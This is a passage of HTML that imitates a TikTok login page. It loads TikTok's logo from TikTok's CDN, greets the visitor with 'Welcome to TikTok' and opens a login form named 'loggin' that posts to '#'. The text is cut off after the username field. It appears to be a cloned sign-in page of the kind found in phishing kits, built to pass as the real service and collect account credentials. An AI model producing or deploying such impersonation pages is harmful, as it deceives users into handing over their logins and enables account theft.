...
<body bgcolor="black">
  <div id="root" style="margin-bottom: 25%;"><div class="tiktok-app-container"><header class="tiktok-web-header"><a href="/" class="header-logo" style="background-image: url(&quot;//s16.tiktokcdn.com/web_login/logo_white.a6bdfc2bad32cb645467e008f3c20041.svg&quot;);"></a></header>
        <section>
       <h1>Welcome to TikTok</h1>
            <form method="post" name="loggin" action="#" id="loggin">
                <fieldset>
                    <input id="username" name="login" type="text" placeholder="Username" required="">
                </fieldset>
                <fieldset>
